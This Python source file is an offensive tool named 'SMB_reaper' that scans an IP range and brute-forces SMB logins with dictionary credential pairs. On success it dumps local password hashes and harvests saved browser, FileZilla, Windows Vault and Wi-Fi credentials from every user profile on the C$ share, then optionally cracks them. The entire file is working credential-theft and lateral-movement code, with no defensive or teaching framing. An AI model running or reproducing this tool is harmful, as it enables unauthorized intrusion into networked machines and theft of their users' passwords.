#####################################
#
#  Made by SBR
#  v1.0
#####################################

import os
import argparse
import json
from tqdm import tqdm
from itertools import product
from passlib.hash import lmhash, nthash
from smb.SMBConnection import SMBConnection
from parser_method import Parser
from ipaddress import IPv4Network
from plugins.secretsdump import Get_users_hashes
from decrypt_method import Decrypt
from Logger import Logger

#########static variables############
client_machine_name = 'PC'
server_name = 'PC'
denied_usr = ['Все пользователи', 'Public', 'All Users', 'Default', 'Default User', '.', '..']
data_folder = 'OUT'
messages = []
Users = []
#####################################

def calculate_subnet(ip, cidr_mask):
    network = IPv4Network(ip + cidr_mask, strict=False)
    first_host = network.network_address + 1
    last_host = network.broadcast_address - 1
    return first_host, last_host


def Get_range_IP(IP):
    addr = IP.split('/')
    addr[1] = '/' + addr[1]
    return calculate_subnet(str(addr[0]), addr[1])


def parse_dict(path, flag):
    data = ['']
    with open(path, 'r', encoding='utf-8') as file:
        data.extend(set(filter(None, file.read().split('\n'))))
    if not flag:
        creds = set(product(data, repeat=2))
    else:
        creds = set(data)
    return creds


def _decrypt(use_decrypt, st):
    if use_decrypt is not None:
        Decrypor = Decrypt(data_folder, use_decrypt, st)
        with open(f'{data_folder}/clear_passwords.txt', 'w', encoding='utf-8') as fp:
            fp.write(f'{Decrypor.Decryptor()}')


def Dump_hashes(path, data):
    users = dict()
    for i in data.values():
        temp = i.split(':', maxsplit=2)
        users[temp[0]] = temp[2][:-3]
    with open(path, 'w', encoding='utf-8') as fp:
        fp.write(json.dumps(users, sort_keys=True, indent=4, ensure_ascii=False))


def main(share, domain, timeout, creds, target, use_decrypt, attempt=0):
    if '/' in target:
        start, stop = Get_range_IP(target)
        alone = False
    else:
        start = stop = target
        alone = True
    if not os.path.exists(data_folder):
        os.mkdir(data_folder)
    logger = Logger(data_folder, True)
    while start <= stop:
        try:
            for pare in tqdm(creds, desc=f"Attempting({start})"):
                temp_pare = list(pare)
                conn = SMBConnection(temp_pare[0], temp_pare[1], client_machine_name, server_name, domain=domain,
                                     use_ntlm_v2=True,
                                     is_direct_tcp=True)
                conn.connect(str(start), 445, timeout=timeout)
                try:
                    folders = conn.listPath(share, '/Users', search=0x10)
                    for folder in folders:
                        if folder.filename not in denied_usr:
                            Users.append(folder.filename)
                    if not os.path.exists(f'{data_folder}/{str(start)}'):
                        os.mkdir(f'{data_folder}/{str(start)}')
                    with open(f'{data_folder}/{str(start)}/all_users.txt', 'w') as fp:
                        for i in Users:
                            fp.write(f'{i}\n')
                    logger.logger([f'Authentication successful - {start} with login = "{temp_pare[0]}" and password = "{temp_pare[1]}"\n\nSTART DOWNLOADING from {start}\n{"-" * 50}'])
                    Dump_hashes(f'{data_folder}/{str(start)}/hashes.txt', Get_users_hashes(str(start), temp_pare[0], f'{lmhash.hash(temp_pare[1], encoding="utf-16le")}:{nthash.hash(temp_pare[1])}'))
                    for i in range(len(Users)):
                        logger.logger([f'\nDownloading for user - {Users[i]}\n{"=" * 50}'])
                        if not os.path.exists(f'{data_folder}/{str(start)}/{Users[i]}'):
                            os.mkdir(f'{data_folder}/{str(start)}/{Users[i]}')
                        parser = Parser('/Users/' + Users[i], f'{data_folder}/{str(start)}/{Users[i]}', conn, share)
                        logger.logger(parser.SSID())
                        logger.logger(parser.Chrome())
                        logger.logger(parser.SYS_SSID())
                        logger.logger(parser.Vault())
                        logger.logger(parser.FireFox())
                        logger.logger(parser.Opera())
                        logger.logger(parser.FileZilla())
                        logger.logger([f'\n{"=" * 50}'])
                    logger.logger([f'\n{"-" * 50}'])
                    conn.close()
                    break
                except:
                    attempt += 1
                    logger.logger(['', f'Authentication error - {start} (login: {temp_pare[0]}; password: {temp_pare[1]})'])
                    conn.close()
                finally:
                    Users.clear()
        except Exception as e:
            logger.logger(['', f'Error connection - {start}\n{"?"*100}\n{e}\n{"?"*100}'])
        if not alone:
            start += 1
        else:
            break
        attempt = 0
    _decrypt(use_decrypt, False)


if '__main__' == __name__:
    args = argparse.ArgumentParser(
        prog='SMB_reaper',
        description='This program collect useful credentials from SMB shares')
    args.add_argument('-u', action='store', type=str, help='SMB login')
    args.add_argument('-p', action='store', type=str, help='SMB password')
    args.add_argument('-domain', action='store', type=str, help='SMB domain', default='WORKGROUP')
    args.add_argument('-target', action='store', type=str, help="Host's IP with CIDR (192.168.0.1/24)")
    args.add_argument('-timeout', type=float, help='SMB connection delay in second', default=1)
    args.add_argument('--use-dict', action='store', type=str, help='Path to login/passwords dictionary')
    args.add_argument('-share', action='store', type=str, help='Share name', default='C$')
    args.add_argument('--auto-decrypt', action='store', type=str, help='Path to passwords dictionary')
    args.add_argument('--only-decrypt', action='store', type=str, help='Use only decrypt function from existed data (Need a dictionary with passwords)')
    opt = args.parse_args()

    if opt.auto_decrypt is None:
        d_passwords = None
    else:
        d_passwords = parse_dict(opt.auto_decrypt, True)

    if opt.u and opt.p and opt.target is not None and (opt.use_dict and opt.only_decrypt is None):
        main(opt.share, opt.domain, opt.timeout, [(opt.u, opt.p)], opt.target, d_passwords)
    elif (opt.u or opt.p) and opt.target and opt.use_dict is not None and opt.only_decrypt is None:
        s_passwords = []
        if opt.u is not None:
            for i in parse_dict(opt.use_dict, True):
                s_passwords.append((opt.u, i))
        else:
            for i in parse_dict(opt.use_dict, True):
                s_passwords.append((i, opt.p))
        main(opt.share, opt.domain, opt.timeout, s_passwords, opt.target, d_passwords)
    elif opt.use_dict and opt.target is not None and opt.only_decrypt is None:
        main(opt.share, opt.domain, opt.timeout, parse_dict(opt.use_dict, False), opt.target, d_passwords)
    elif opt.only_decrypt is not None:
        _decrypt(parse_dict(opt.only_decrypt, True), True)
    else:
        print('login/password/target not specified')